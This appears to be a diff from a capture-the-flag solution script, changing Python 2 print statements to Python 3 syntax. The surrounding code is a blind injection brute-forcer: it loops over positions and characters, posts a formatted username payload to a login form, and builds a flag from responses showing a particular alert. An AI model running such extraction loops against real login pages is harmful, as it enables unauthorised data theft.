@@ -13,11 +13,11 @@ flag=""
 guess = '{}abcdefghijklmnopqrstuvwxyz0123456789'
 
 for i in range(1,40): 
-  print "round: "+ str(i)
+  print("round: "+ str(i))
   for j in guess:
     tmp = j
     j = ord(j)
-    print "[+]"+ username.format(i,j,i,j)
+    print("[+]"+ username.format(i,j,i,j))
     d={'username': username.format(i,j,i,j), 'password': password}
     re = requests.post(urlr,data=d)
     s = requests.session()
@@ -39,4 +39,4 @@ for i in range(1,40):
     if "alert('Your grades is 0')" in re.text:
       flag += tmp
       break
-  print flag
+  print(flag)
